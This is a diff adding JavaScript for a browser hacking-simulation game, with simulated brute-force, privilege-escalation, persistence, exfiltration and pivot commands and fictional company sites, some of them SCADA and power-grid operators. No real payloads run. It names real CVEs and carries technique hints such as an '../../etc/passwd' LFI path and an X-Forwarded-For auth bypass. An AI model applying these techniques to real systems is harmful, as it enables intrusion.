+  if(!svc||!ip){tPrint('err','Usage: brute <service> <ip>');return;}
+  if(G.tools.indexOf('hydra')<0){tPrint('err','[!] hydra not installed.');return;}
+  var co=COMPANIES.find(function(c){return c.ip===ip;});
+  if(!co){tPrint('err','Unknown target.');return;}
+  tPrint('sys','[*] Hydra: '+svc.toUpperCase()+' @ '+ip);
+  tPrint('warn','[!] Brute force is noisy -- IDS may detect.');
+  if(co.sec.ids){riseWanted(1);triggerIDS(co);}
+  after(2500,function(){
+    var creds=Object.entries(co.creds||[]);
+    if(creds.length) tPrint('ok','[+] '+ip+'  login: '+creds[0][0]+'  password: '+creds[0][1]);
+    else tPrint('err','[-] No credentials found.');
+  });
+}
+
+function normPath(cwd,rel) {
+  if(!rel||rel==='.') return cwd;
+  if(rel==='..') return cwd.lastIndexOf('/')>0 ? cwd.substring(0,cwd.lastIndexOf('/')) : '/';
+  if(rel.startsWith('/')) return rel.replace(/\/+/g,'/').replace(/\/$/,'')||'/';
+  return (cwd==='/'?'':cwd)+'/'+rel;
+}
+
+function cmdLs(args,s,t) {
+  if(!s.connected||!t){tPrint('err','-bash: ls: not connected');return;}
+  var path=normPath(s.cwd,args[0]||'.');
+  var entries=t.fs[path];
+  if(entries===undefined){tPrint('err','ls: '+(args[0]||'.')+': No such file or directory');return;}
+  if(!entries.length){tPrint('dim','(empty)');return;}
+  entries.forEach(function(e){
+    var fp=(path==='/'?'/':path+'/')+e;
+    var isDir=!!t.fs[fp];
+    var isKey=e.endsWith('id_rsa')||e.endsWith('.key')||e.endsWith('.pem');
+    var isLocked=(fp.startsWith('/root')||fp.includes('Administrator'))&&!s.isRoot;
+    var cls=isLocked?'dim':isKey?'keyf':isDir?'dir':e.match(/\.(sh|py)$/)?'exe':'fil';
+    tPrint(cls,(isDir?'d':'-')+'rwxr-xr-x  '+e+(isDir?'/':''));
+  });
+}
+
+function cmdCd(args,s,t) {
+  if(!s.connected||!t){tPrint('err','-bash: cd: not connected');return;}
+  var dest=args[0]||'/';
+  var path=normPath(s.cwd,dest);
+  if(!t.fs[path]){tPrint('err','-bash: cd: '+dest+': No such file or directory');return;}
+  if((path.startsWith('/root')||path.includes('Administrator'))&&!s.isRoot){
+    tPrint('err','cd: '+dest+': Permission denied');tPrint('dim','Run privesc first.');return;
+  }
+  G.session.cwd=path; updatePrompt(); renderFS();
+}
+
+function cmdCat(args,s,t) {
+  var f=args[0]; if(!f){tPrint('err','Usage: cat <file>');return;}
+  if(f==='walkthrough.txt'){WALKTHROUGH.split('\n').forEach(function(l){tPrint('pre',l);});return;}
+  if(f==='tools.txt'){printToolsTxt();return;}
+  if(f==='exploits.txt'){printExploitsTxt();return;}
+  if(!s.connected||!t){tPrint('err','cat: '+f+': No such file or directory');return;}
+  var fp=normPath(s.cwd,f);
+  var prot=fp.startsWith('/root')||fp.includes('Administrator');
+  if(prot&&!s.isRoot){tPrint('err','cat: '+f+': Permission denied');tPrint('dim','Hint: privesc first.');return;}
+  if(fp.endsWith('shadow')&&!s.isRoot){tPrint('err','cat: '+f+': Permission denied');return;}
+  var content=(t.fc||{})[fp];
+  if(content!==undefined){content.split('\n').forEach(function(l){tPrint('pre',l);});return;}
+  var dir=fp.substring(0,fp.lastIndexOf('/')||1);
+  var base=fp.substring(fp.lastIndexOf('/')+1);
+  if((t.fs[dir]||[]).indexOf(base)>=0){tPrint('dim','[Binary or unreadable file]');return;}
+  tPrint('err','cat: '+f+': No such file or directory');
+}
+
+function printToolsTxt() {
+  tPrint('hdr','INSTALLED TOOLS & EXPLOIT COMMANDS');tPrint('pre','');
+  G.tools.forEach(function(id){
+    var item=SHOP.find(function(s){return s.id===id;}); if(!item) return;
+    tPrint('ok','['+item.name+']');
+    tPrint('dim','  '+item.desc);
+    item.cmds.forEach(function(c){tPrint('sys','  $ '+c);});
+    tPrint('pre','');
+  });
+}
+
+function printExploitsTxt() {
+  tPrint('hdr','EXPLOIT QUICK REFERENCE');
+  tPrint('sys','NETWORK (requires metasploit)');
+  tPrint('dim','  exploit CVE-2017-7679 <ip>    Apache mod_mime overflow');
+  tPrint('dim','  exploit CVE-2020-1938 <ip>    Ghostcat AJP');
+  tPrint('dim','  exploit CVE-2021-22144 <ip>   Kibana SSRF pivot');
+  tPrint('dim','  exploit CVE-2022-1388 <ip>    F5 BIG-IP auth bypass');
+  tPrint('dim','  exploit vsftpd-backdoor <ip>  FTP backdoor root shell');
+  tPrint('dim','  exploit S7-auth-bypass <ip>   Siemens ICS');
+  tPrint('sys','WEB APP');
+  tPrint('dim','  exploit sqli / xss / lfi / csrf / idor  <ip>');
+  tPrint('sys','PRIVESC');
+  tPrint('dim','  privesc linpeas / sudo / suid / cron / token');
+}
+
+function cmdPrivesc(args,s,t) {
+  if(!s.connected||!t){tPrint('err','Not connected.');return;}
+  if(s.isRoot){tPrint('ok','[+] Already root. uid=0');return;}
+  var method=args[0]||'linpeas';
+  if(method==='linpeas'&&G.tools.indexOf('linpeas')<0&&G.tools.indexOf('metasploit-pro')<0){
+    tPrint('err','[!] linPEAS or Metasploit Pro required.');return;
+  }
+  tPrint('sys','[*] Running privesc: '+method+'...');
+  after(2000,function(){
+    tPrint('pre','Method: '+t.rootMethod);
+    after(700,function(){
+      tPrint('ok','[+] Privilege escalation successful!');
+      tPrint('ok','[+] uid=0(root) gid=0(root)');
+      G.session.user='root'; G.session.isRoot=true;
+      if(!G.pwned[t.id]) G.pwned[t.id]={hasShell:false,hasRoot:false,exfilled:[],persisted:false};
+      G.pwned[t.id].hasRoot=true;
+      updatePrompt(); renderFS(); saveGame();
+      tPrint('dim','Next: persist cron  then  exfil /root/flag.txt https');
+      G.credits += 100; tPrint('ok','[+] Privilege escalation bonus: +₿100 credits'); renderTopbar();
+    });
+  });
+}
+
+function cmdPersist(args,s,t) {
+  if(!s.connected||!t){tPrint('err','Not connected.');return;}
+  if(!s.isRoot){tPrint('err','[!] Root required. Run "privesc" first.');return;}
+  var method=args[0]||'cron';
+  tPrint('sys','[*] Installing persistence ('+method+')...');
+  after(900,function(){
+    if(!G.pwned[t.id]) G.pwned[t.id]={hasShell:false,hasRoot:false,exfilled:[],persisted:false};
+    G.pwned[t.id].persisted=true;
+    tPrint('ok','[+] Persistence installed. Survives reboot.');
+    saveGame(); renderNetmap();
+  });
+}
+
+function cmdExfil(args,s,t) {
+  if(!s.connected||!t){tPrint('err','Not connected.');return;}
+  var fp=args[0],method=args[1]||'https';
+  if(!fp){tPrint('err','Usage: exfil <path> [https|dns|http]');return;}
+  var full=normPath(s.cwd,fp);
+  var prot=full.startsWith('/root')||full.includes('Administrator');
+  if(prot&&!s.isRoot){tPrint('err','[!] Root required to exfil protected paths.');return;}
+  if(method==='http'&&t.sec.ids){riseWanted(1);tPrint('warn','[!] HTTP exfil detected by IDS!');}
+  var dir=full.substring(0,full.lastIndexOf('/')||1);
+  var base=full.substring(full.lastIndexOf('/')+1);
+  var hasFile=(t.fc&&t.fc[full]!==undefined)||((t.fs[dir]||[]).indexOf(base)>=0);
+  if(!hasFile){tPrint('err','exfil: '+fp+': File not found');return;}
+  tPrint('sys','[*] Exfiltrating '+full+' via '+method.toUpperCase()+'...');
+  after(1200,function(){
+    tPrint('ok','[+] Transfer complete: '+base+' \u2192 local/exfil/'+base);
+    if(!G.pwned[t.id]) G.pwned[t.id]={hasShell:false,hasRoot:false,exfilled:[],persisted:false};
+    if(!G.pwned[t.id].exfilled) G.pwned[t.id].exfilled=[];
+    if(G.pwned[t.id].exfilled.indexOf(full)<0) G.pwned[t.id].exfilled.push(full);
+    checkContracts(t,full); saveGame(); renderFS();
+  });
+}
+
+function cmdCurl(args) {
+  var url=args[0]; if(!url){tPrint('err','Usage: curl <url>');return;}
+  var co=COMPANIES.find(function(c){return url.includes(c.domain)||url.includes(c.ip);});
+  tPrint('sys','[*] GET '+url);
+  after(500,function(){
+    if(!co){tPrint('err','curl: (6) Could not resolve host');return;}
+    tPrint('pre','HTTP/1.1 200 OK\nServer: Apache/2.2.34');
+    tPrint('pre','[Response -- use Browser pane for full render]');
+    if(!G.reconDone[co.id]) G.reconDone[co.id]={};
+    G.reconDone[co.id].curl=true;
+    if(url.includes('../')||url.includes('%2F..%2F')) tPrint('warn','[!] Directory traversal -- LFI possible');
+  });
+}
+
+function cmdContracts() {
+  tPrint('hdr','CONTRACTS');
+  var any=false;
+  COMPANIES.forEach(function(co){
+    (co.contracts||[]).forEach(function(ct){
+      var st=G.contracts[ct.id]; if(st==='inactive') return;
+      any=true;
+      tPrint(st==='complete'?'ok':'warn','['+co.name+'] '+(st==='complete'?'\u2713':'\u25CF')+' '+ct.title);
+      tPrint('dim','     '+ct.desc);
+      tPrint('dim','     \u20BF'+ct.reward.c+' + '+ct.reward.r+' REP');
+    });
+  });
+  if(!any) tPrint('dim','No active contracts. Earn REP to unlock targets.');
+}
+
+function cmdDisc() {
+  if(!G.session.connected){tPrint('dim','Not connected.');return;}
+  G.session={connected:false,targetId:null,user:null,cwd:'/',isRoot:false};
+  updatePrompt(); renderFS(); tPrint('ok','Connection closed.');
+}
+
+function cmdCve(args) {
+  var q=args.join(' ').toLowerCase();
+  if(!q){switchPane('cve');tPrint('dim','CVE-DB tab opened.');return;}
+  var r=CVE_DB.filter(function(c){
+    return c.id.toLowerCase().includes(q)||c.name.toLowerCase().includes(q)||c.service.toLowerCase().includes(q);
+  });
+  if(!r.length){tPrint('dim','No CVEs matching "'+q+'". See CVE-DB tab.');return;}
+  r.forEach(function(c){
+    tPrint('warn',c.id+' -- '+c.name);
+    tPrint('dim','  '+c.service+'  CVSS: '+c.score+'  '+c.sev.toUpperCase());
+    tPrint('dim','  '+c.desc.substring(0,100)+'...');tPrint('','');
+  });
+}
+
+function cmdPivot(args,s,t) {
+  if(!s.connected||!t){tPrint('err','Not connected.');return;}
+  if(!s.isRoot){tPrint('err','[!] Root/SYSTEM required.');return;}
+  if(G.tools.indexOf('metasploit-pro')<0){tPrint('err','[!] Metasploit Pro required.');return;}
+  var dst=args[1]||args[0];
+  tPrint('sys','[*] Pivoting through '+t.domain+' to '+dst+'...');
+  after(1500,function(){tPrint('ok','[+] Pivot established: '+t.ip+' \u2192 '+dst);});
+}
+
+function cmdRun(args) {
+  var name=args[0]; if(!name){tPrint('err','Usage: run <script-name>');return;}
+  var sc=G.scripts&&G.scripts.find(function(s){return s.name===name;});
+  if(!sc){tPrint('err','run: '+name+': not found. Use "editor" to create.');return;}
+  tPrint('sys','[*] Executing: '+sc.name+'.sh');
+  sc.code.split('\n').filter(function(l){return l.trim()&&!l.trim().startsWith('#');}).slice(0,5).forEach(function(l){tPrint('dim','  '+l);});
+  tPrint('ok','[+] Script executed.');
+}
+
+// ═══════════════════════════ CONTRACTS & PROGRESSION ═══════════════════════════
+function checkContracts(target,path) {
+  (target.contracts||[]).forEach(function(ct){
+    if(G.contracts[ct.id]!=='active') return;
+    var exfilled=G.pwned[target.id]?(G.pwned[target.id].exfilled||[]):[];
+    if(ct.target===path||exfilled.indexOf(ct.target)>=0){
+      G.contracts[ct.id]='complete';
+      G.credits+=ct.reward.c; G.rep+=ct.reward.r;
+      tPrint('ok','');
+      tPrint('ok','\u2554\u2550\u2550 CONTRACT COMPLETE \u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557');
+      tPrint('ok','  '+ct.title);
+      tPrint('ok','  \u20BF'+ct.reward.c+' credits + '+ct.reward.r+' REP');
+      tPrint('ok','\u255A\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255D');
+      renderTopbar(); checkUnlock(); saveGame(); toast('\u2713 '+ct.title);
+    }
+  });
+}
+
+function checkUnlock() {
+  COMPANIES.forEach(function(co){
+    if(G.discovered.indexOf(co.id)>=0) return;
+    if(G.rep>=co.repReq){
+      G.discovered.push(co.id);
+      (co.contracts||[]).forEach(function(ct){if(G.contracts[ct.id]==='inactive')G.contracts[ct.id]='active';});
+      tPrint('ok','[NETWORK] Unlocked: '+co.name+' ('+co.ip+')');
+      toast('\uD83D\uDD78 Target unlocked: '+co.name);
+      renderNetmap();
+    }
+  });
+}
+
+// ═══════════════════════════ WANTED ═══════════════════════════
+function riseWanted(n) {
+  if(!n) n=1;
+  if(G.tools.indexOf('tor')>=0) return;
+  var f=G.tools.indexOf('vpn-chain')>=0?0.4:1;
+  G.wanted=Math.min(5,G.wanted+(n*f)); renderWanted();
+  if(G.wanted>=3){
+    document.getElementById('ids-bar').classList.add('on');
+    setTimeout(function(){document.getElementById('ids-bar').classList.remove('on');},5000);
+  }
+}
+function triggerIDS(co){tPrint('warn','[IDS] '+co.name+' intrusion detected!');riseWanted(1);}
+function renderWanted() {
+  if(!G) return;
+  for(var i=1;i<=5;i++){
+    var el=document.getElementById('ws'+i); if(!el) continue;
+    var on=i<=Math.floor(G.wanted);
+    el.classList.toggle('on',on); el.classList.remove('w3','w4','w5');
+    if(on&&i===3) el.classList.add('w3');
+    if(on&&i>=4) el.classList.add('w4');
+  }
+}
+
+// ═══════════════════════════ RENDER ═══════════════════════════
+function renderTopbar() {
+  if(!G) return;
+  document.getElementById('tb-credits').textContent=G.credits;
+  document.getElementById('tb-rep').textContent=G.rep;
+  if(G.miners&&Object.keys(G.miners).length>0){
+    var total=Object.values(G.miners).reduce(function(a,m){return a+m.rate;},0);
+    document.getElementById('tb-miner-rate').textContent=total;
+    document.getElementById('tb-miner-stat').style.display='';
+  }
+}
+
+function renderFS() {
+  if(!G) return;
+  var s=G.session, t=s.connected?COMPANIES.find(function(c){return c.id===s.targetId;}):null;
+  document.getElementById('fs-path-disp').textContent=s.connected?s.cwd:'/home/'+G.handle;
+  document.getElementById('fs-ctx').textContent=t?t.domain:'local machine';
+  document.getElementById('fs-prev').style.display='none';
+  var el=document.getElementById('fs-body');
+  if(!s.connected){
+    el.innerHTML=
+      '<div class="fsi dir">\uD83D\uDCC1 ./</div>'+
+      '<div class="fsi fil" data-lf="walkthrough">\uD83D\uDCC4 walkthrough.txt</div>'+
+      '<div class="fsi fil" data-lf="tools">\uD83D\uDCC4 tools.txt</div>'+
+      '<div class="fsi fil" data-lf="exploits">\uD83D\uDCC4 exploits.txt</div>'+
+      '<div class="fsi dir">\uD83D\uDCC1 exfil/ ('+Object.values(G.pwned).reduce(function(a,p){return a+(p.exfilled||[]).length;},0)+' files)</div>'+
+      '<div class="fsi dir">\uD83D\uDCC1 scripts/ ('+(G.scripts?G.scripts.length:0)+')</div>'+
+      (G.scripts||[]).map(function(s){return '<div class="fsi exe" data-sc="'+s.name+'">\u2699 '+s.name+'.sh</div>';}).join('');
+    el.querySelectorAll('[data-lf]').forEach(function(d){
+      d.addEventListener('click',function(){
+        var f=this.getAttribute('data-lf');
+        if(f==='walkthrough') termExec('cat walkthrough.txt');
+        else if(f==='tools') termExec('cat tools.txt');
+        else if(f==='exploits') termExec('cat exploits.txt');
+        switchPane('terminal');
+      });
+    });
+    return;
+  }
+  var fs=t.fs,cwd=s.cwd,entries=fs[cwd]||[];
+  var html='';
+  if(cwd!=='/') html+='<div class="fsi dir" data-cd="..">\uD83D\uDCC1 ../</div>';
+  entries.forEach(function(e){
+    var fp=(cwd==='/'?'/':cwd+'/')+e;
+    var isDir=!!fs[fp];
+    var isKey=e.endsWith('id_rsa')||e.endsWith('.key')||e.endsWith('.pem');
+    var isLocked=(fp.startsWith('/root')||fp.includes('Administrator'))&&!s.isRoot;
+    var icon=isLocked?'\uD83D\uDD12':isKey?'\uD83D\uDD11':isDir?'\uD83D\uDCC1':e.match(/\.(sh|py)$/)?'\u2699':'\uD83D\uDCC4';
+    var cls=isLocked?'lck':isKey?'keyf':isDir?'dir':e.match(/\.(sh|py)$/)?'exe':'fil';
+    html+='<div class="fsi '+cls+'"'+(isDir&&!isLocked?' data-cd="'+fp+'"':'')+(!isDir&&!isLocked?' data-fp="'+fp+'"':'')+'>'+icon+' '+e+(isDir?'/':'')+'</div>';
+  });
+  el.innerHTML=html;
+  el.querySelectorAll('[data-cd]').forEach(function(d){
+    d.addEventListener('click',function(){termExec('cd '+this.getAttribute('data-cd'));});
+  });
+  el.querySelectorAll('[data-fp]').forEach(function(d){
+    d.addEventListener('click',function(){
+      var fp=this.getAttribute('data-fp');
+      var content=(t.fc||{})[fp];
+      var pr=document.getElementById('fs-prev');
+      if(content!==undefined){pr.style.display='block';pr.textContent=content.substring(0,400)+(content.length>400?'\n[...cat for full file]':'');}
+      termExec('cat '+fp); switchPane('terminal');
+    });
+  });
+}
+
+function renderNetmap() {
+  if(!G) return;
+  document.getElementById('net-meta').textContent=G.discovered.length+' targets';
+  document.getElementById('net-ascii').textContent=
+    '\u250C\u2500 DARKNET MAP \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n'+
+    '\u2502  ['+G.handle.substring(0,18).padEnd(18,' ')+']  eth0:10.0.0.2  \u2502\n'+
+    '\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518';
+  var el=document.getElementById('net-targets'),html='';
+  COMPANIES.forEach(function(co){
+    var disc=G.discovered.indexOf(co.id)>=0,pw=G.pwned[co.id]||{},ag=G.agents[co.id]||[];
+    if(!disc){
+      html+='<div class="nc lkd"><div class="nc-name">??? UNKNOWN</div><div class="nc-ip">Requires '+co.repReq+' REP</div><div class="nc-tags"><span class="tag tag-'+co.diff+'">'+co.diff.toUpperCase()+'</span><span class="tag tag-lkd">LOCKED</span></div></div>';
+      return;
+    }
+    html+='<div class="nc '+(pw.hasRoot?'pwned':pw.hasShell?'shell':'')+'" data-id="'+co.id+'">'+
+      '<div class="nc-name">'+co.name+'</div>'+
+      '<div class="nc-ip">'+co.ip+' \u00B7 '+co.domain+'</div>'+
+      '<div class="nc-desc">'+co.desc+'</div>'+
+      '<div class="nc-tags">'+
+      '<span class="tag tag-'+co.diff+'">'+co.diff.toUpperCase()+'</span>'+
+      (pw.hasRoot?'<span class="tag tag-pwned">ROOTED</span>':'')+
+      (pw.hasShell&&!pw.hasRoot?'<span class="tag tag-shell">SHELL</span>':'')+
+      (pw.persisted?'<span class="tag" style="color:var(--cyan);border-color:#00ffff33">PERSIST</span>':'')+(G.miners&&G.miners[co.id]?'<span class="tag" style="color:var(--amber);border-color:#ffb00033">⛏ MINING</span>':'')+
+      (co.sec.ids?'<span class="tag tag-ids">IDS</span>':'')+
+      (co.sec.fw?'<span class="tag tag-fw">FW</span>':'')+
+      (co.sec.waf?'<span class="tag tag-fw">WAF</span>':'')+
+      (ag.length?'<span class="tag" style="color:var(--g);border-color:#00ff4133">'+ag.length+' AGENT</span>':'')+
+      '</div></div>';
+  });
+  el.innerHTML=html;
+}
+
+function renderCveDb() {
+  var q=(document.getElementById('cve-search').value||'').toLowerCase();
+  var r=q?CVE_DB.filter(function(c){
+    return c.id.toLowerCase().includes(q)||c.name.toLowerCase().includes(q)||c.service.toLowerCase().includes(q)||c.sev.includes(q);
+  }):CVE_DB;
+  document.getElementById('cve-body').innerHTML=r.map(function(c){
+    return '<div class="cve-card">'+
+      '<div class="cve-id">'+c.id+'</div>'+
+      '<div class="cve-name">'+c.name+'</div>'+
+      '<span class="cve-score '+c.sev+'">CVSS '+c.score+' \u2014 '+c.sev.toUpperCase()+'</span>'+
+      '<div class="cve-desc">'+c.desc.substring(0,150)+'...</div>'+
+      '<div class="cve-detail">'+
+      '<div style="margin-bottom:4px"><b style="color:var(--g)">Service:</b> '+c.service+' Port: '+c.port+'</div>'+
+      '<div style="margin-bottom:4px"><b style="color:var(--g)">Phase:</b> '+c.phase+'</div>'+
+      '<div style="margin-bottom:4px"><b style="color:var(--g)">Exploit:</b><pre style="color:var(--cyan);font-size:10px;margin-top:3px;white-space:pre-wrap">'+c.exploit+'</pre></div>'+
+      '<div><b style="color:var(--g)">Remediation:</b> '+c.fix+'</div>'+
+      '</div></div>';
+  }).join('');
+}
+
+// ═══════════════════════════ BROWSER ═══════════════════════════
+var curSite=null,curPage=null;
+
+function buildSite(coId,page) {
+  var co=COMPANIES.find(function(c){return c.id===coId;}); if(!co) return '<p style="color:var(--red)">Site not found.</p>';
+  var pw=G?(G.pwned[coId]||{}):{}, sess=G?G.session:{};
+  var loggedIn=pw.hasShell&&sess.targetId===coId;
+  var navItems=(co.site.pages||[]).map(function(p){
+    return '<div class="snav'+(p===page?' on':'')+'" data-pg="'+p+'">'+p.toUpperCase()+'</div>';
+  }).join('');
+
+  var pages={
+    c0:{
+      home:'<div class="ssec"><h3>Reliable Pipeline Monitoring Since 1998</h3><p>PetroFlow Systems provides SCADA-integrated monitoring for oil &amp; gas infrastructure. ~60 staff.</p></div><div class="ssec"><h3>Stack</h3><ul><li>Apache HTTP Server 2.2.34</li><li>MySQL 5.5.62</li><li>vsftpd 2.3.4 (file transfer)</li></ul></div>',
+      about:'<div class="ssec"><h3>About</h3><p>60 staff. helpdesk [at] petroflow.local</p></div>',
+      services:'<div class="ssec"><h3>API Endpoints</h3><p><span class="slink" data-load="c0|api">/api/users.php <span class="vi vi-idor">IDOR</span></span></p></div>',
+      contact:'<div class="ssec"><h3>Contact</h3><p>helpdesk [at] petroflow.local</p></div><div class="ssec"><h3>Message <span class="vi vi-xss">XSS</span></h3><div class="sform"><label>Name</label><input id="pf-cn" autocomplete="off"><label>Message (stored)</label><textarea id="pf-cm" style="height:55px"></textarea><button class="fbtn" id="pf-submit">SEND</button><div id="pf-cr"></div></div></div>',
+      portal:loggedIn
+        ?'<div class="ssec"><div class="salert ok">\u2713 Authenticated as '+(sess.user||'user')+(pw.hasRoot?' [ROOT]':'')+'</div><h3>Ops Portal</h3><ul><li><span class="slink" data-term="cat /var/www/html/config.php">View config.php</span></li><li><span class="slink" data-term="exfil /root/flag.txt https">Exfil flag</span></li></ul></div>'
+        :'<div class="ssec"><h3>Login <span class="vi vi-sqli">SQLi</span> <span class="vi vi-csrf">CSRF</span></h3><div class="sform"><label>Username</label><input id="pf-u" autocomplete="off" autocorrect="off" autocapitalize="off"><label>Password</label><input id="pf-p" type="password"><p class="meta" style="margin-top:4px">No CSRF token. No prepared statements.</p><button class="fbtn" id="pf-login">LOGIN</button><div id="pf-lr"></div></div></div>',
+      api:'<div class="ssec"><h3>/api/users.php <span class="vi vi-idor">IDOR</span></h3><p>Returns user by ID. No auth check.</p><div class="sform"><label>id</label><div style="display:flex;gap:5px"><input id="pf-aid" value="1" style="width:70px"><button class="fbtn" id="pf-api-btn">FETCH</button></div></div><div id="pf-ar" style="display:none;margin-top:7px;font-size:10px;color:var(--g);font-family:Share Tech Mono,monospace;white-space:pre;background:#010801;padding:7px;"></div></div>',
+    },
+    c1:{
+      home:'<div class="ssec"><h3>Accelerating Drug Discovery</h3><p>14 active clinical trials. Basel, CH. 420 employees.</p></div><div class="ssec"><h3>Infrastructure</h3><p>Java/Tomcat, PostgreSQL, Redis, Kibana 7.x</p></div>',
+      pipeline:'<div class="ssec"><div class="salert warn">\u26A0 Pipeline data -- internal access required.</div></div>',
+      careers:'<div class="ssec"><h3>Open Roles</h3><ul><li>Senior DevOps Engineer</li><li>QA Analyst</li></ul><p class="meta">careers [at] ngpharma.net</p></div>',
+      contact:'<div class="ssec"><h3>Contact</h3><p>security [at] ngpharma.net</p></div>',
+      portal:loggedIn
+        ?'<div class="ssec"><div class="salert ok">\u2713 Authenticated as '+(sess.user||'user')+'</div><h3>Research Portal</h3></div>'
+        :'<div class="ssec"><h3>Staff Portal <span class="vi vi-lfi">LFI</span></h3><div class="sform"><label>Username</label><input id="ng-u" autocomplete="off" autocorrect="off" autocapitalize="off"><label>Password</label><input id="ng-p" type="password"><p class="meta" style="margin-top:4px">LFI: /portal?page=../../etc/passwd</p><button class="fbtn" id="ng-login">LOGIN</button><div id="ng-lr"></div></div></div>',
+    },
+    c2:{
+      home:'<div class="ssec"><h3>Capital Markets Intelligence</h3><p>AUM: $12.4B \u00B7 ISO 27001 \u00B7 London, New York, Singapore</p></div><div class="ssec"><h3>Infrastructure</h3><p>F5 BIG-IP 15.1.2 \u00B7 Kibana 7.12.0 \u00B7 Elasticsearch 7.12</p></div>',
+      about:'<div class="ssec"><h3>About</h3><p>Founded 2001. HFT, structured products, alternative investments.</p></div>',
+      services:'<div class="ssec"><h3>Services</h3><ul><li>Algorithmic trading</li><li>Portfolio analytics</li><li>MiFID II reporting</li></ul></div>',
+      compliance:'<div class="ssec"><h3>Security</h3><ul><li>SOC 2 Type II \u00B7 ISO 27001</li><li>MFA on all staff</li><li>WAF + IDS on perimeter</li><li>F5 BIG-IP v15.1.2</li></ul></div>',
+      contact:'<div class="ssec"><h3>Contact</h3><p>security [at] arclightfg.com</p></div>',
+      portal:loggedIn
+        ?'<div class="ssec"><div class="salert ok">\u2713 Authenticated</div><h3>Trading Portal</h3></div>'
+        :'<div class="ssec"><h3>Secure Login <span class="vi vi-auth">AUTH</span></h3><div class="sform"><label>Username</label><input id="af-u" autocomplete="off" autocorrect="off" autocapitalize="off"><label>Password</label><input id="af-p" type="password"><label>MFA Token</label><input id="af-m" placeholder="000000"><p class="meta" style="margin-top:4px">Auth bypass via X-Forwarded-For manipulation</p><button class="fbtn" id="af-login">LOGIN</button><div id="af-lr"></div></div></div>',
+    },
+    c3:{
+      home:'<div class="ssec"><h3>Reliable Energy for 2.1M Residents</h3><p>Regional power distribution. 99.97% uptime. NERC CIP compliant.</p></div><div class="ssec"><h3>Grid Status</h3><p style="color:#00ff88">\u25CF All substations nominal \u00B7 Load: 847 MW</p><p style="color:var(--yellow)">\u26A0 Transformer_7 temperature advisory (89%)</p></div>',
+      operations:'<div class="ssec"><h3>SCADA</h3><p>Siemens S7-1500 PLCs \u00B7 Schneider Modicon \u00B7 S7comm/102 \u00B7 Modbus/502 \u00B7 DNP3/20000</p></div>',
+      about:'<div class="ssec"><h3>About</h3><p>Public utility. Est. 1962. FERC regulated.</p></div>',
+      contact:'<div class="ssec"><h3>Contact</h3><p>ops [at] civicgrid.ics</p></div>',
+      portal:loggedIn
+        ?'<div class="ssec"><div class="salert ok">\u2713 Authenticated</div><h3>SCADA Interface</h3></div>'
+        :'<div class="ssec"><h3>Staff Portal <span class="vi vi-idor">IDOR</span></h3><div class="sform"><label>Username</label><input id="cg-u" autocomplete="off" autocorrect="off" autocapitalize="off"><label>Password</label><input id="cg-p" type="password"><label>MFA Token</label><input id="cg-m" placeholder="000000"><button class="fbtn" id="cg-login">LOGIN</button><div id="cg-lr"></div></div></div>',
+    }
+  ,c4:{
+      home:'<div class="ssec"><h3>Data Intelligence at Scale</h3><p>Darkpeak Analytics processes consumer behaviour data for marketing and risk analytics. 14M+ profiles.</p></div><div class="ssec"><h3>Stack</h3><p>Apache 2.4 · MongoDB 3.4 · Elasticsearch 6.8</p></div>',
+      about:'<div class="ssec"><h3>About</h3><p>Data broker operating since 2018. Offshore entity.</p></div>',
+      services:'<div class="ssec"><h3>Services</h3><ul><li>Consumer profile enrichment</li><li>Risk scoring APIs</li><li>Behavioural analytics</li></ul></div>',
+      contact:'<div class="ssec"><h3>Contact</h3><p>info [at] darkpeak.io</p></div>',
+      portal:loggedIn?'<div class="ssec"><div class="salert ok">✓ Authenticated as '+(sess.user||'user')+(pw.hasRoot?' [ROOT]':'')+'</div><h3>Analytics Dashboard</h3></div>':'<div class="ssec"><h3>Staff Login <span class="vi vi-sqli">SQLi</span></h3><div class="sform"><label>Username</label><input id="dp-u" autocomplete="off" autocorrect="off" autocapitalize="off"><label>Password</label><input id="dp-p" type="password"><button class="fbtn" id="dp-login">LOGIN</button><div id="dp-lr"></div></div></div>',
+    }
+  ,c5:{
+      home:'<div class="ssec"><h3>Reliable Offshore VPS Hosting</h3><p>OmniCloud provides anonymous, no-log VPS infrastructure to hundreds of tenants globally.</p></div><div class="ssec"><h3>Infrastructure</h3><p>nginx 1.18 · Jetty 9.4 · Kibana 7.x · Sinatra API</p></div>',
+      plans:'<div class="ssec"><h3>VPS Plans</h3><ul><li>Basic: 1vCPU / 2GB RAM / ₿29/mo</li><li>Pro: 4vCPU / 8GB RAM / ₿79/mo</li><li>Ultra: 16vCPU / 32GB RAM / ₿199/mo</li></ul></div>',
+      support:'<div class="ssec"><div class="salert warn">⚠ Support only via ticket system for verified customers.</div></div>',
+      datacenter:'<div class="ssec"><h3>Datacenter</h3><p>Offshore jurisdiction. No DMCA. No logs. Tier-3 datacenter.</p></div>',
+      contact:'<div class="ssec"><h3>Contact</h3><p>support [at] omnicloud.net</p></div>',
+      portal:loggedIn?'<div class="ssec"><div class="salert ok">✓ Authenticated as '+(sess.user||'user')+(pw.hasRoot?' [ROOT]':'')+'</div><h3>Tenant Management Portal</h3></div>':'<div class="ssec"><h3>Client Login <span class="vi vi-lfi">LFI</span></h3><div class="sform"><label>Username</label><input id="oc-u" autocomplete="off" autocorrect="off" autocapitalize="off"><label>Password</label><input id="oc-p" type="password"><button class="fbtn" id="oc-login">LOGIN</button><div id="oc-lr"></div></div></div>',
+    }
+  ,c6:{
+      home:'<div class="ssec"><h3>Protecting National Interests</h3><p>Sentinel Defense Systems provides advanced C4ISR, cyber defense, and autonomous systems to allied governments.</p></div><div class="ssec"><h3>Infrastructure</h3><p>F5 BIG-IP 16 · Kibana 7.11 · MSSQL 2019 · OpenLDAP</p></div>',
